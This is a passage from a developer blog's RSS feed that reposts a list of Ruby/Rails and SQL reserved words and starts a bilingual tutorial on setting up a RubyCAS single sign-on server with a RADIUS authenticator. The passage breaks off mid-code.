      <pubDate>Thu, 20 Dec 2012 06:55:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ruby-cas-client-and-single-sign-out</link>
    </item>
    <item>
      <title>最全的 Ruby/ Rails 保留字 ( ruby/rails reserved words complete ) </title>
      <description>&lt;p&gt;原文见：&amp;#160;&lt;a href="http://latheesh.com/2010/02/02/rails-reserved-words/" title="http://latheesh.com/2010/02/02/rails-reserved-words/" target="_blank"&gt;http://latheesh.com/2010/02/02/rails-reserved-words/&lt;/a&gt;
&lt;/p&gt;

&lt;div class="entry single"&gt;
							&lt;img width="175" height="150" src="http://latheesh.com/wp-content/uploads/2011/02/ruby-175x150.png" class="single-post-thm alignright border wp-post-image" alt="ruby" /&gt;							&lt;p&gt;Rails doesn’t like it if you name your models and columns some of the words that it uses in the framework. This is a collection of those words so that a lot of the confusion can be avoided.&lt;br /&gt;
&lt;span id="more-454"&gt;&lt;/span&gt;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Reserved Words:&lt;/strong&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ADDITIONAL_LOAD_PATHS&lt;/li&gt;
&lt;li&gt;ARGF&lt;/li&gt;
&lt;li&gt;ARGV&lt;/li&gt;
&lt;li&gt;ActionController&lt;/li&gt;
&lt;li&gt;ActionView&lt;/li&gt;
&lt;li&gt;ActiveRecord&lt;/li&gt;
&lt;li&gt;ArgumentError&lt;/li&gt;
&lt;li&gt;Array&lt;/li&gt;
&lt;li&gt;BasicSocket&lt;/li&gt;
&lt;li&gt;Benchmark&lt;/li&gt;
&lt;li&gt;Bignum&lt;/li&gt;
&lt;li&gt;Binding&lt;/li&gt;
&lt;li&gt;&lt;a href="http://oldwiki.rubyonrails.org/rails/pages/CGI"&gt;CGI&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;CGIMethods&lt;/li&gt;
&lt;li&gt;CROSS_COMPILING&lt;/li&gt;
&lt;li&gt;Class&lt;/li&gt;
&lt;li&gt;ClassInheritableAttributes&lt;/li&gt;
&lt;li&gt;Comparable&lt;/li&gt;
&lt;li&gt;ConditionVariable&lt;/li&gt;
&lt;li&gt;Config&lt;/li&gt;
&lt;li&gt;Continuation&lt;/li&gt;
&lt;li&gt;DRb&lt;/li&gt;
&lt;li&gt;DRbIdConv&lt;/li&gt;
&lt;li&gt;DRbObject&lt;/li&gt;
&lt;li&gt;DRbUndumped&lt;/li&gt;
&lt;li&gt;Data&lt;/li&gt;
&lt;li&gt;Date&lt;/li&gt;
&lt;li&gt;DateTime&lt;/li&gt;
&lt;li&gt;Delegater&lt;/li&gt;
&lt;li&gt;Delegator&lt;/li&gt;
&lt;li&gt;Digest&lt;/li&gt;
&lt;li&gt;Dir&lt;/li&gt;
&lt;li&gt;ENV&lt;/li&gt;
&lt;li&gt;EOFError&lt;/li&gt;
&lt;li&gt;ERB&lt;/li&gt;
&lt;li&gt;Enumerable&lt;/li&gt;
&lt;li&gt;Errno&lt;/li&gt;
&lt;li&gt;Exception&lt;/li&gt;
&lt;li&gt;FALSE&lt;/li&gt;
&lt;li&gt;FalseClass&lt;/li&gt;
&lt;li&gt;Fcntl&lt;/li&gt;
&lt;li&gt;File&lt;/li&gt;
&lt;li&gt;FileList&lt;/li&gt;
&lt;li&gt;FileTask&lt;/li&gt;
&lt;li&gt;FileTest&lt;/li&gt;
&lt;li&gt;FileUtils&lt;/li&gt;
&lt;li&gt;Fixnum&lt;/li&gt;
&lt;li&gt;Float&lt;/li&gt;
&lt;li&gt;FloatDomainError&lt;/li&gt;
&lt;li&gt;GC&lt;/li&gt;
&lt;li&gt;Gem&lt;/li&gt;
&lt;li&gt;GetoptLong&lt;/li&gt;
&lt;li&gt;Hash&lt;/li&gt;
&lt;li&gt;IO&lt;/li&gt;
&lt;li&gt;IOError&lt;/li&gt;
&lt;li&gt;IPSocket&lt;/li&gt;
&lt;li&gt;IPsocket&lt;/li&gt;
&lt;li&gt;IndexError&lt;/li&gt;
&lt;li&gt;Inflector&lt;/li&gt;
&lt;li&gt;Integer&lt;/li&gt;
&lt;li&gt;Interrupt&lt;/li&gt;
&lt;li&gt;Kernel&lt;/li&gt;
&lt;li&gt;LN_SUPPORTED&lt;/li&gt;
&lt;li&gt;LoadError&lt;/li&gt;
&lt;li&gt;LocalJumpError&lt;/li&gt;
&lt;li&gt;Logger&lt;/li&gt;
&lt;li&gt;Marshal&lt;/li&gt;
&lt;li&gt;MatchData&lt;/li&gt;
&lt;li&gt;MatchingData&lt;/li&gt;
&lt;li&gt;Math&lt;/li&gt;
&lt;li&gt;Method&lt;/li&gt;
&lt;li&gt;Module&lt;/li&gt;
&lt;li&gt;Mutex&lt;/li&gt;
&lt;li&gt;Mysql&lt;/li&gt;
&lt;li&gt;MysqlError&lt;/li&gt;
&lt;li&gt;MysqlField&lt;/li&gt;
&lt;li&gt;MysqlRes&lt;/li&gt;
&lt;li&gt;NIL&lt;/li&gt;
&lt;li&gt;NameError&lt;/li&gt;
&lt;li&gt;NilClass&lt;/li&gt;
&lt;li&gt;NoMemoryError&lt;/li&gt;
&lt;li&gt;NoMethodError&lt;/li&gt;
&lt;li&gt;NoWrite&lt;/li&gt;
&lt;li&gt;NotImplementedError&lt;/li&gt;
&lt;li&gt;Numeric&lt;/li&gt;
&lt;li&gt;OPT_TABLE&lt;/li&gt;
&lt;li&gt;Object&lt;/li&gt;
&lt;li&gt;ObjectSpace&lt;/li&gt;
&lt;li&gt;Observable&lt;/li&gt;
&lt;li&gt;Observer&lt;/li&gt;
&lt;li&gt;PGError&lt;/li&gt;
&lt;li&gt;PGconn&lt;/li&gt;
&lt;li&gt;PGlarge&lt;/li&gt;
&lt;li&gt;PGresult&lt;/li&gt;
&lt;li&gt;PLATFORM&lt;/li&gt;
&lt;li&gt;PStore&lt;/li&gt;
&lt;li&gt;ParseDate&lt;/li&gt;
&lt;li&gt;Precision&lt;/li&gt;
&lt;li&gt;Proc&lt;/li&gt;
&lt;li&gt;Process&lt;/li&gt;
&lt;li&gt;Queue&lt;/li&gt;
&lt;li&gt;RAKEVERSION&lt;/li&gt;
&lt;li&gt;RELEASE_DATE&lt;/li&gt;
&lt;li&gt;RUBY&lt;/li&gt;
&lt;li&gt;RUBY_PLATFORM&lt;/li&gt;
&lt;li&gt;RUBY_RELEASE_DATE&lt;/li&gt;
&lt;li&gt;RUBY_VERSION&lt;/li&gt;
&lt;li&gt;Rack&lt;/li&gt;
&lt;li&gt;Rake&lt;/li&gt;
&lt;li&gt;RakeApp&lt;/li&gt;
&lt;li&gt;RakeFileUtils&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;RangeError&lt;/li&gt;
&lt;li&gt;Rational&lt;/li&gt;
&lt;li&gt;Regexp&lt;/li&gt;
&lt;li&gt;RegexpError&lt;/li&gt;
&lt;li&gt;Request&lt;/li&gt;
&lt;li&gt;RuntimeError&lt;/li&gt;
&lt;li&gt;STDERR&lt;/li&gt;
&lt;li&gt;STDIN&lt;/li&gt;
&lt;li&gt;STDOUT&lt;/li&gt;
&lt;li&gt;ScanError&lt;/li&gt;
&lt;li&gt;ScriptError&lt;/li&gt;
&lt;li&gt;SecurityError&lt;/li&gt;
&lt;li&gt;Signal&lt;/li&gt;
&lt;li&gt;SignalException&lt;/li&gt;
&lt;li&gt;SimpleDelegater&lt;/li&gt;
&lt;li&gt;SimpleDelegator&lt;/li&gt;
&lt;li&gt;Singleton&lt;/li&gt;
&lt;li&gt;SizedQueue&lt;/li&gt;
&lt;li&gt;Socket&lt;/li&gt;
&lt;li&gt;SocketError&lt;/li&gt;
&lt;li&gt;StandardError&lt;/li&gt;
&lt;li&gt;String&lt;/li&gt;
&lt;li&gt;StringScanner&lt;/li&gt;
&lt;li&gt;Struct&lt;/li&gt;
&lt;li&gt;Symbol&lt;/li&gt;
&lt;li&gt;SyntaxError&lt;/li&gt;
&lt;li&gt;SystemCallError&lt;/li&gt;
&lt;li&gt;SystemExit&lt;/li&gt;
&lt;li&gt;SystemStackError&lt;/li&gt;
&lt;li&gt;TCPServer&lt;/li&gt;
&lt;li&gt;TCPSocket&lt;/li&gt;
&lt;li&gt;TCPserver&lt;/li&gt;
&lt;li&gt;TCPsocket&lt;/li&gt;
&lt;li&gt;TOPLEVEL_BINDING&lt;/li&gt;
&lt;li&gt;TRUE&lt;/li&gt;
&lt;li&gt;Task&lt;/li&gt;
&lt;li&gt;Text&lt;/li&gt;
&lt;li&gt;Thread&lt;/li&gt;
&lt;li&gt;ThreadError&lt;/li&gt;
&lt;li&gt;ThreadGroup&lt;/li&gt;
&lt;li&gt;Time&lt;/li&gt;
&lt;li&gt;Transaction&lt;/li&gt;
&lt;li&gt;TrueClass&lt;/li&gt;
&lt;li&gt;TypeError&lt;/li&gt;
&lt;li&gt;UDPSocket&lt;/li&gt;
&lt;li&gt;UDPsocket&lt;/li&gt;
&lt;li&gt;UNIXServer&lt;/li&gt;
&lt;li&gt;UNIXSocket&lt;/li&gt;
&lt;li&gt;UNIXserver&lt;/li&gt;
&lt;li&gt;UNIXsocket&lt;/li&gt;
&lt;li&gt;UnboundMethod&lt;/li&gt;
&lt;li&gt;Url&lt;/li&gt;
&lt;li&gt;VERSION&lt;/li&gt;
&lt;li&gt;Verbose&lt;/li&gt;
&lt;li&gt;&lt;a href="http://oldwiki.rubyonrails.org/rails/pages/YAML"&gt;YAML&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;ZeroDivisionError&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Other Problematic Names:&lt;/strong&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;accept&lt;/li&gt;
&lt;li&gt;callback – breaks validation if used as a model method.&lt;/li&gt;
&lt;li&gt;categorie&lt;/li&gt;
&lt;li&gt;action&lt;/li&gt;
&lt;li&gt;attributes – if you have a has_many called attributes, you can’t  access to your object attributes anymore; only the associated objects&lt;/li&gt;
&lt;li&gt;application&lt;sup&gt;&lt;a href="http://oldwiki.rubyonrails.org/rails/pages/ReservedWords#fn2"&gt;2&lt;/a&gt;
&lt;/sup&gt;&lt;/li&gt;
&lt;li&gt;@base_path – setting this variable name in a controller method  seems to break the ablity to render a partial in the view. The view will  render with no content and no errors will be generated .&lt;/li&gt;
&lt;li&gt;connection – there seems to be a connection class already&lt;/li&gt;
&lt;li&gt;database – (in mysql)&lt;/li&gt;
&lt;li&gt;dispatcher&lt;/li&gt;
&lt;li&gt;display&lt;sup&gt;&lt;a href="http://oldwiki.rubyonrails.org/rails/pages/ReservedWords#fn1"&gt;1&lt;/a&gt;
&lt;/sup&gt;&lt;/li&gt;
&lt;li&gt;drive – fixtures will not autogenerate IDs in Rails 2.0.2&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.elctech.com/snippets/bonus-rails-reserved-words-1"&gt;errors&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;format&lt;/li&gt;
&lt;li&gt;host  – I had a text_field :host, :name that I saw problems with. (JR)&lt;/li&gt;
&lt;li&gt;key&lt;/li&gt;
&lt;li&gt;layout – If you have a model called Layout and in a controller have  “scaffold :layout” it generates an exception.  However, if you  script/generate the scaffold for layout it works.&lt;/li&gt;
&lt;li&gt;load – When making an Ajax call to an action named load, the  action’s code will be skipped (or otherwise rendered useless). This is  made apparent by: a) @variables are not available in the view, b)  calling render :layout =&amp;gt; false still yields the layout.&lt;/li&gt;
&lt;li&gt;link – breaks migrations when used as a column name in combination with validation: &lt;a href="http://dev.rubyonrails.org/ticket/4953"&gt;ticket&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;new, override to news if you want a news table&lt;/li&gt;
&lt;li&gt;notify – &lt;a href="http://dev.rubyonrails.org/ticket/62"&gt;not a valid column name&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;open – &lt;a href="http://dev.rubyonrails.org/ticket/62"&gt;not a valid column name&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;public&lt;/li&gt;
&lt;li&gt;quote &lt;a href="http://dev.rubyonrails.org/ticket/3628"&gt;‘quote’ cannot be used as a column name&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;render – cannot be used as an action name&lt;/li&gt;
&lt;li&gt;request&lt;/li&gt;
&lt;li&gt;records – a table named records seemed to cause duplicate entries to be found by find&lt;/li&gt;
&lt;li&gt;responses – scaffold borks with “undefined method ‘body=’ “&lt;/li&gt;
&lt;li&gt;save – ActiveRecord uses this to save the object.&lt;/li&gt;
&lt;li&gt;scope – do not use as an association name because ActiveRecord::Base.scope is called instead&lt;/li&gt;
&lt;li&gt;send&lt;/li&gt;
&lt;li&gt;session (session_controller or SessionController will not work)&lt;/li&gt;
&lt;li&gt;system – a table column named system causes problems when trying to generate scaffold&lt;/li&gt;
&lt;li&gt;template – a table named templates causes an error when you try to invoke the create method of the default controller&lt;/li&gt;
&lt;li&gt;test (however those work with &lt;em&gt;ruby test/unit/axis&lt;/em&gt;test.rb_ and &lt;em&gt;rake test&lt;/em&gt;units_)&lt;/li&gt;
&lt;li&gt;timeout – an ActiveRecord attribute named timeout will clash with the global function “timeout” defined in Ruby’s timeout.rb&lt;/li&gt;
&lt;li&gt;to_s — naming a model instance method to_s resulted in ‘File not  found’ for any view an object of this class (should have) appeared in  (no matter which method called) and WebRick had to be restarted. I  couldn’t drag the very cause into light, but in the traces ‘to_s’ gave  me a hint. After renaming everything worked well again.&lt;/li&gt;
&lt;li&gt;type — or any of the other &lt;a href="http://oldwiki.rubyonrails.org/rails/pages/MagicFieldNames"&gt;MagicFieldNames&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;URI&lt;/li&gt;
&lt;li&gt;visits — a table column named visits causes problems when trying to query some_obj.visits.&lt;/li&gt;
&lt;li&gt;Observer — for a model name works in development environment but not in production.&lt;br /&gt;
singular names finishing in “s”: Axis → Axes, Access → Accesses, will break the pluralization in &lt;em&gt;rake&lt;/em&gt;: Axi, Acces&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Magic Field Names:&lt;/strong&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;created_at&lt;/li&gt;
&lt;li&gt;created_on&lt;/li&gt;
&lt;li&gt;updated_at&lt;/li&gt;
&lt;li&gt;updated_on&lt;/li&gt;
&lt;li&gt;lock_version&lt;/li&gt;
&lt;li&gt;type&lt;/li&gt;
&lt;li&gt;id&lt;/li&gt;
&lt;li&gt;#{table_name}_count&lt;/li&gt;
&lt;li&gt;position&lt;/li&gt;
&lt;li&gt;parent_id&lt;/li&gt;
&lt;li&gt;lft&lt;/li&gt;
&lt;li&gt;rgt&lt;/li&gt;
&lt;li&gt;quote_value (is used for quoting)&lt;/li&gt;
&lt;li&gt;template&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Reserved Words for Various SQL Databases:&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;A, ABORT, ABS, ABSOLUTE, ACCESS, ACTION, ADA, ADD, ADMIN, AFTER, AGGREGATE, ALIAS, ALL, ALLOCATE, ALSO, ALTER, ALWAYS, ANALYSE, ANALYZE, AND, ANY, ARE, ARRAY, AS, ASC, ASENSITIVE, ASSERTION, ASSIGNMENT, ASYMMETRIC, AT, ATOMIC, ATTRIBUTE, ATTRIBUTES, AUTHORIZATION, AVG, BACKUP, BACKWARD, BEFORE, BEGIN, BERNOULLI, BETWEEN, BIGINT, BINARY, BIT, BITVAR, BIT_LENGTH, BLOB, BOOLEAN, BOTH, BREADTH, BREAK, BROWSE, BULK, BY, C, CACHE, CALL, CALLED, CARDINALITY, CASCADE, CASCADED, CASE, CAST, CATALOG, CATALOG_NAME, CEIL, CEILING, CHAIN, CHANGE, CHAR, CHARACTER, CHARACTERISTICS, CHARACTERS, CHARACTER_LENGTH, CHARACTER_SET_CATALOG, CHARACTER_SET_NAME, CHARACTER_SET_SCHEMA, CHAR_LENGTH, CHECK, CHECKED, CHECKPOINT, CLASS, CLASS_ORIGIN, CLOB, CLOSE, CLUSTER, CLUSTERED, COALESCE, COBOL, COLLATE, COLLATION, COLLATION_CATALOG, COLLATION_NAME, COLLATION_SCHEMA, COLLECT, COLUMN, COLUMN_NAME, COMMAND_FUNCTION, COMMAND_FUNCTION_CODE, COMMENT, COMMIT, COMMITTED, COMPLETION, COMPUTE, CONCURRENTLY, CONDITION, CONDITION_NUMBER, CONNECT, CONNECTION, CONNECTION_NAME, CONSTRAINT, CONSTRAINTS, CONSTRAINT_CATALOG, CONSTRAINT_NAME, CONSTRAINT_SCHEMA, CONSTRUCTOR, CONTAINS, CONTAINSTABLE, CONTINUE, CONVERSION, CONVERT, COPY, CORR, CORRESPONDING, COUNT, COVAR_POP, COVAR_SAMP, CREATE, CREATEDB, CREATEROLE, CREATEUSER, CROSS, CSV, CUBE, CUME_DIST, CURRENT, CURRENT_DATE, CURRENT_DEFAULT_TRANSFORM_GROUP, CURRENT_PATH, CURRENT_ROLE, CURRENT_TIME, CURRENT_TIMESTAMP, CURRENT_TRANSFORM_GROUP_FOR_TYPE, CURRENT_USER, CURSOR, CURSOR_NAME, CYCLE, DATA, DATABASE, DATABASES, DATE, DATETIME_INTERVAL_CODE, DATETIME_INTERVAL_PRECISION, DAY, DAY_HOUR, DAY_MICROSECOND, DAY_MINUTE, DAY_SECOND, DBCC, DEALLOCATE, DEC, DECIMAL, DECLARE, DEFAULT, DEFAULTS, DEFERRABLE, DEFERRED, DEFINED, DEFINER, DEGREE, DELAYED, DELETE, DELIMITER, DELIMITERS, DENSE_RANK, DENY, DEPTH, DEREF, DERIVED, DESC, DESCRIBE, DESCRIPTOR, DESTROY, DESTRUCTOR, DETERMINISTIC, DIAGNOSTICS, DICTIONARY, DISABLE, DISCONNECT, DISK, DISPATCH, DISTINCT, DISTINCTROW, DISTRIBUTED, DIV, DO, DOMAIN, DOUBLE, DROP, DUAL, DUMMY, DUMP, DYNAMIC, DYNAMIC_FUNCTION, DYNAMIC_FUNCTION_CODE, EACH, ELEMENT, ELSE, ELSEIF, ENABLE, ENCLOSED, ENCODING, ENCRYPTED, END, END-EXEC, EQUALS, ERRLVL, ESCAPE, ESCAPED, EVERY, EXCEPT, EXCEPTION, EXCLUDE, EXCLUDING, EXCLUSIVE, EXEC, EXECUTE, EXISTING, EXISTS, EXIT, EXP, EXPLAIN, EXTERNAL, EXTRACT, FALSE, FETCH, FILE, FILLFACTOR, FILTER, FINAL, FIRST, FLOAT, FLOAT4, FLOAT8, FLOOR, FOLLOWING, FOR, FORCE, FOREIGN, FORTRAN, FORWARD, FOUND, FREE, FREETEXT, FREETEXTTABLE, FREEZE, FROM, FULL, FULLTEXT, FUNCTION, FUSION, G, GENERAL, GENERATED, GET, GLOBAL, GO, GOTO, GRANT, GRANTED, GREATEST, GROUP, GROUPING, HANDLER, HAVING, HEADER, HIERARCHY, HIGH_PRIORITY, HOLD, HOLDLOCK, HOST, HOUR, HOUR_MICROSECOND, HOUR_MINUTE, HOUR_SECOND, IDENTITY, IDENTITYCOL, IDENTITY_INSERT, IF, IGNORE, ILIKE, IMMEDIATE, IMMUTABLE, IMPLEMENTATION, IMPLICIT, IN, INCLUDE, INCLUDING, INCREMENT, INDEX, INDEXES, INDICATOR, INFILE, INFIX, INHERIT, INHERITS, INITIALIZE, INITIALLY, INNER, INOUT, INPUT, INSENSITIVE, INSERT, INSTANCE, INSTANTIABLE, INSTEAD, INT, INT1, INT2, INT3, INT4, INT8, INTEGER, INTERSECT, INTERSECTION, INTERVAL, INTO, INVOKER, IS, ISNULL, ISOLATION, ITERATE, JOIN, K, KEY, KEYS, KEY_MEMBER, KEY_TYPE, KILL, LANCOMPILER, LANGUAGE, LARGE, LAST, LATERAL, LEADING, LEAST, LEAVE, LEFT, LENGTH, LESS, LEVEL, LIKE, LIMIT, LINENO, LINES, LISTEN, LN, LOAD, LOCAL, LOCALTIME, LOCALTIMESTAMP, LOCATION, LOCATOR, LOCK, LOGIN, LONG, LONGBLOB, LONGTEXT, LOOP, LOWER, LOW_PRIORITY, M, MAP, MATCH, MATCHED, MAX, MAXVALUE, MEDIUMBLOB, MEDIUMINT, MEDIUMTEXT, MEMBER, MERGE, MESSAGE_LENGTH, MESSAGE_OCTET_LENGTH, MESSAGE_TEXT, METHOD, MIDDLEINT, MIN, MINUTE, MINUTE_MICROSECOND, MINUTE_SECOND, MINVALUE, MOD, MODE, MODIFIES, MODIFY, MODULE, MONTH, MORE, MOVE, MULTISET, MUMPS, NAME, NAMES, NATIONAL, NATURAL, NCHAR, NCLOB, NESTING, NEW, NEXT, NO, NOCHECK, NOCREATEDB, NOCREATEROLE, NOCREATEUSER, NOINHERIT, NOLOGIN, NONCLUSTERED, NONE, NORMALIZE, NORMALIZED, NOSUPERUSER, NOT, NOTHING, NOTIFY, NOTNULL, NOWAIT, NO_WRITE_TO_BINLOG, NULL, NULLABLE, NULLIF, NULLS, NUMBER, NUMERIC, OBJECT, OCTETS, OCTET_LENGTH, OF, OFF, OFFSET, OFFSETS, OIDS, OLD, ON, ONLY, OPEN, OPENDATASOURCE, OPENQUERY, OPENROWSET, OPENXML, OPERATION, OPERATOR, OPTIMIZE, OPTION, OPTIONALLY, OPTIONS, OR, ORDER, ORDERING, ORDINALITY, OTHERS, OUT, OUTER, OUTFILE, OUTPUT, OVER, OVERLAPS, OVERLAY, OVERRIDING, OWNED, OWNER, PAD, PARAMETER, PARAMETERS, PARAMETER_MODE, PARAMETER_NAME, PARAMETER_ORDINAL_POSITION, PARAMETER_SPECIFIC_CATALOG, PARAMETER_SPECIFIC_NAME, PARAMETER_SPECIFIC_SCHEMA, PARTIAL, PARTITION, PASCAL, PASSWORD, PATH, PERCENT, PERCENTILE_CONT, PERCENTILE_DISC, PERCENT_RANK, PLACING, PLAN, PLI, POSITION, POSTFIX, POWER, PRECEDING, PRECISION, PREFIX, PREORDER, PREPARE, PREPARED, PRESERVE, PRIMARY, PRINT, PRIOR, PRIVILEGES, PROC, PROCEDURAL, PROCEDURE, PUBLIC, PURGE, QUOTE, RAID0, RAISERROR, RANGE, RANK, READ, READS, READTEXT, REAL, REASSIGN, RECHECK, RECONFIGURE, RECURSIVE, REF, REFERENCES, REFERENCING, REGEXP, REGR_AVGX, REGR_AVGY, REGR_COUNT, REGR_INTERCEPT, REGR_R2, REGR_SLOPE, REGR_SXX, REGR_SXY, REGR_SYY, REINDEX, RELATIVE, RELEASE, RENAME, REPEAT, REPEATABLE, REPLACE, REPLICATION, REQUIRE, RESET, RESIGNAL, RESTART, RESTORE, RESTRICT, RESULT, RETURN, RETURNED_CARDINALITY, RETURNED_LENGTH, RETURNED_OCTET_LENGTH, RETURNED_SQLSTATE, RETURNING, RETURNS, REVOKE, RIGHT, RLIKE, ROLE, ROLLBACK, ROLLUP, ROUTINE, ROUTINE_CATALOG, ROUTINE_NAME, ROUTINE_SCHEMA, ROW, ROWCOUNT, ROWGUIDCOL, ROWS, ROW_COUNT, ROW_NUMBER, RULE, SAVE, SAVEPOINT, SCALE, SCHEMA, SCHEMAS, SCHEMA_NAME, SCOPE, SCOPE_CATALOG, SCOPE_NAME, SCOPE_SCHEMA, SCROLL, SEARCH, SECOND, SECOND_MICROSECOND, SECTION, SECURITY, SELECT, SELF, SENSITIVE, SEPARATOR, SEQUENCE, SERIALIZABLE, SERVER_NAME, SESSION, SESSION_USER, SET, SETOF, SETS, SETUSER, SHARE, SHOW, SHUTDOWN, SIGNAL, SIMILAR, SIMPLE, SIZE, SMALLINT, SOME, SONAME, SOURCE, SPACE, SPATIAL, SPECIFIC, SPECIFICTYPE, SPECIFIC_NAME, SQL, SQLCA, SQLCODE, SQLERROR, SQLEXCEPTION, SQLSTATE, SQLWARNING, SQL_BIG_RESULT, SQL_CALC_FOUND_ROWS, SQL_SMALL_RESULT, SQRT, SSL, STABLE, START, STARTING, STATE, STATEMENT, STATIC, STATISTICS, STDDEV_POP, STDDEV_SAMP, STDIN, STDOUT, STORAGE, STRAIGHT_JOIN, STRICT, STRUCTURE, STYLE, SUBCLASS_ORIGIN, SUBLIST, SUBMULTISET, SUBSTRING, SUM, SUPERUSER, SYMMETRIC, SYSID, SYSTEM, SYSTEM_USER, TABLE, TABLESAMPLE, TABLESPACE, TABLE_NAME, TEMP, TEMPLATE, TEMPORARY, TERMINATE, TERMINATED, TEXTSIZE, THAN, THEN, TIES, TIME, TIMESTAMP, TIMEZONE_HOUR, TIMEZONE_MINUTE, TINYBLOB, TINYINT, TINYTEXT, TO, TOP, TOP_LEVEL_COUNT, TRAILING, TRAN, TRANSACTION, TRANSACTIONS_COMMITTED, TRANSACTIONS_ROLLED_BACK, TRANSACTION_ACTIVE, TRANSFORM, TRANSFORMS, TRANSLATE, TRANSLATION, TREAT, TRIGGER, TRIGGER_CATALOG, TRIGGER_NAME, TRIGGER_SCHEMA, TRIM, TRUE, TRUNCATE, TRUSTED, TSEQUAL, TYPE, UESCAPE, UNBOUNDED, UNCOMMITTED, UNDER, UNDO, UNENCRYPTED, UNION, UNIQUE, UNKNOWN, UNLISTEN, UNLOCK, UNNAMED, UNNEST, UNSIGNED, UNTIL, UPDATE, UPDATETEXT, UPPER, USAGE, USE, USER, USER_DEFINED_TYPE_CATALOG, USER_DEFINED_TYPE_CODE, USER_DEFINED_TYPE_NAME, USER_DEFINED_TYPE_SCHEMA, USING, UTC_DATE, UTC_TIME, UTC_TIMESTAMP, VACUUM, VALID, VALIDATOR, VALUE, VALUES, VARBINARY, VARCHAR, VARCHARACTER, VARIABLE, VARYING, VAR_POP, VAR_SAMP, VERBOSE, VIEW, VOLATILE, WAITFOR, WHEN, WHENEVER, WHERE, WHILE, WIDTH_BUCKET, WINDOW, WITH, WITHIN, WITHOUT, WORK, WRITE, WRITETEXT, X509, XOR, YEAR, YEAR_MONTH, ZEROFILL, ZONE&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Reference:&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;&lt;a href="http://oldwiki.rubyonrails.org/rails/pages/ReservedWords"&gt;http://oldwiki.rubyonrails.org/rails/pages/ReservedWords&lt;/a&gt;
&lt;/p&gt;
																				&lt;/div&gt;</description>
      <pubDate>Thu, 20 Dec 2012 02:45:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ruby-rails-reserved-words-complete</link>
    </item>
    <item>
      <title>搭建ruby cas server (setting up ruby cas server ) </title>
      <description>&lt;p&gt;公司有几个项目要整合，使用单点登录（sso ），所以我在考虑用哪个服务器。 （ Our company is integrating the existing applications using Single Sign On, so I am considering which CAS server to use)&amp;#160;&lt;/p&gt;
&lt;p&gt;java 的 jasig cas 服务器，起源于耶鲁大学。 非常有名，之前我也使用过。不过缺点是配置麻烦，还要使用Maven 来编译，定制。 &amp;#160;(the CAS server's java implementation: jasig CAS is created by Yalo University. it's famous and I have used it before. It's powerful but complicated in configuration, especially when you want to do some customization, you have to compile it using Maven and have to know its infrastructure classes and source codes. )&lt;/p&gt;
&lt;p&gt;考虑到现有的几个项目都是RUBY 项目，公司不缺少RUBY 技术力量，所以我打算用 RUBY CAS SERVER （ &lt;a href="https://github.com/rubycas/rubycas-server/wiki/Installation"&gt;https://github.com/rubycas/rubycas-server/wiki/Installation &lt;/a&gt; ) &amp;#160; &amp;#160; &amp;#160;( Since our company does have good Ruby programmers, I decided to choose RUBY CAS server )&amp;#160;&lt;/p&gt;
&lt;p&gt;步骤如下： (Steps: )&lt;/p&gt;
&lt;p&gt;1. 取出代码（ checkout the ruby codes )&amp;#160;&lt;/p&gt;
&lt;pre&gt; $git clone git://github.com/rubycas/rubycas-server.git &lt;/pre&gt;
&lt;pre&gt; 2. cd rubycas-server &lt;/pre&gt;
&lt;pre&gt; 3. cp config/config.example.yml config.yml &lt;/pre&gt;
&lt;p&gt; 4. 编辑config.yml (  Customize your server by modifying the config.yml file. It is well commented but make sure that you take care of the following: ) 
&lt;/p&gt;
&lt;p&gt; 4.1   Change the database driver to mysql2  &lt;/p&gt;
&lt;p&gt; 4.2   Configure at least one authenticator &lt;/p&gt;
&lt;p&gt; 4.3  You might want to change log.file to something local, so that you don't need root. For example just casserver.log &lt;/p&gt;
&lt;p&gt;   You might also want to disable SSL for now by commenting out the ssl_cert line and changing the port to something like 8888 &lt;/p&gt; 
&lt;p&gt; 5. 建立数据库： Create the database (i.e. 
&lt;/p&gt;
&lt;pre&gt;  $ mysqladmin -u root create casserver  &lt;/pre&gt;
   or whatever you have in config.yml) &lt;p&gt;6. 修改现有的Gemfile:   Modify the existing Gemfile by adding drivers for your database server. For example, if you configured mysql2 in config.yml, 
  add this to the Gemfile:&lt;/p&gt;
&lt;pre&gt; 
gem "mysql2"  
gem "radiustar"
&lt;/pre&gt;
&lt;p&gt;7. Run 
   $ bundle install:&amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;#160;8 $bundle exec rubycas-server -c config.yml&lt;/p&gt;
&lt;p&gt;9. 增加新的 authenticator . &amp;#160; &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;#160; 1. $ copy the RADIUS directory files.&amp;#160;&lt;br /&gt;
&amp;#160; 2. $ write the authenticate.rb file .e.g.&lt;br /&gt;&amp;#160; 
&lt;/p&gt;
&lt;pre&gt;  1 require 'rubygems'
  2 require 'radiustar'
  3 class AuthenticationTool
  4   RADIUT_CLIENT_IP = ''
  5   RADIUT_SERVER_IP = ''
  6   PUBLIC_KEY = 'your-public-secret'
  7   def self.authenticate_using_radiut username, password
  8     auth_custom_attr = { 'NAS-IP-Address' =&amp;gt; RADIUT_CLIENT_IP }
  9             
 10     req = Radiustar::Request.new(RADIUT_SERVER_IP,
 11       { :dict =&amp;gt; Radiustar::Dictionary.new('lib/radius_dictionarys') })
